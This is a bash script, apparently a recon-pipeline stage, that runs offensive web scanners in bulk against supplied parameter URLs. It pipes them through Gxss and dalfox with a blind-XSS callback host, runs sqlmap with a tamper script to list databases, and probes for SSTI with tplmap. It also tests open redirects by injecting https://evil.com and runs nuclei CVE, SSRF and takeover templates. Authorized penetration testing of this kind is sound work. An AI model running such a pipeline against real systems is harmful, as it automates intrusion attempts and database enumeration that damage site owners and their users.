#!/bin/bash
# Phase 4: Calculus-Gated Targeted Vuln Scanning

set -euo pipefail

PARAMS_FILE="${1:-params.txt}"
JS_SECRETS="${2:-js-secrets.txt}"
OUTPUT_DIR="recon-$(date +%Y%m%d-%H%M)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 4: Targeted Vuln Scan → $OUTPUT_DIR"
echo "[*] Calculus filter: Value > Cost + Risk + Irreversibility"

# Read config
MIN_VALUE=1000
MAX_COST=30
MAX_RISK=7

# Filter params by calculus (simplified - in practice would use targets.yaml)
# For now, limit to high-value params
cat "$PARAMS_FILE" | head -500 > "$OUTPUT_DIR/high-value-params.txt"

echo "[+] XSS (reflected + blind)"
cat "$OUTPUT_DIR/high-value-params.txt" | Gxss -c 100 -p XssReflected 2>/dev/null | dalfox pipe -b "${XSS_SERVER_URL:-https://xss.bug}" -w 100 -o "$OUTPUT_DIR/xss.txt" 2>/dev/null || true
cat "$OUTPUT_DIR/high-value-params.txt" | dalfox pipe -b "${XSS_SERVER_URL:-https://xss.bug}" -blind -o "$OUTPUT_DIR/xss-blind.txt" 2>/dev/null || true

echo "[+] SQLi"
sqlmap -m "$OUTPUT_DIR/high-value-params.txt" --batch --random-agent --level 1 --tamper=space2comment --dbs -o "$OUTPUT_DIR/sqli.txt" 2>/dev/null || true

echo "[+] SSTI"
cat "$OUTPUT_DIR/high-value-params.txt" | tplmap 2>/dev/null | anew "$OUTPUT_DIR/ssti.txt" || true

echo "[+] CORS"
cat "$LIVE_FILE" 2>/dev/null | CORS-Scanner 2>/dev/null | anew "$OUTPUT_DIR/cors.txt" || true

echo "[+] Open Redirect"
cat "$PARAMS_FILE" 2>/dev/null | grep -E "(url|redirect|next|return|goto)=http" | qsreplace "https://evil.com" | while read url; do
    curl -s -L "$url" -I | grep -i "evil.com" && echo "$url"
done > "$OUTPUT_DIR/redirect.txt" 2>/dev/null || true

echo "[+] SSRF"
nuclei -l "$OUTPUT_DIR/high-value-params.txt" -t ssrf/ -silent -o "$OUTPUT_DIR/ssrf.txt" 2>/dev/null || true

echo "[+] IDOR (pattern-based)"
grep -E "(id|user|account|order)=[0-9]+" "$OUTPUT_DIR/high-value-params.txt" | anew "$OUTPUT_DIR/idor-candidates.txt" 2>/dev/null || true

# Nuclei targeted
echo "[+] Nuclei (critical/high/medium)"
nuclei -l "$OUTPUT_DIR/high-value-params.txt" -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ -t fuzzing-templates/ -t ssl/ -t dns/ -t takeovers/ -rate-limit 100 -severity critical,high,medium -silent -o "$OUTPUT_DIR/nuclei.txt" 2>/dev/null || true

# Subdomain takeover
if [[ -f "live.txt" ]]; then
    nuclei -l live.txt -t takeovers/ -silent -o "$OUTPUT_DIR/takeover.txt" 2>/dev/null || true
    subzy run --targets live.txt | anew "$OUTPUT_DIR/takeover.txt" 2>/dev/null || true
fi

# Merge & verify
cat "$OUTPUT_DIR"/*.txt 2>/dev/null | grep -v "^\s*$" | sort -u > "$OUTPUT_DIR/vulns-raw.txt"
# TODO: Verify each finding
cp "$OUTPUT_DIR/vulns-raw.txt" "$OUTPUT_DIR/vulns.txt"

echo "[*] Findings: $(wc -l < "$OUTPUT_DIR/vulns.txt" 2>/dev/null || echo 0)"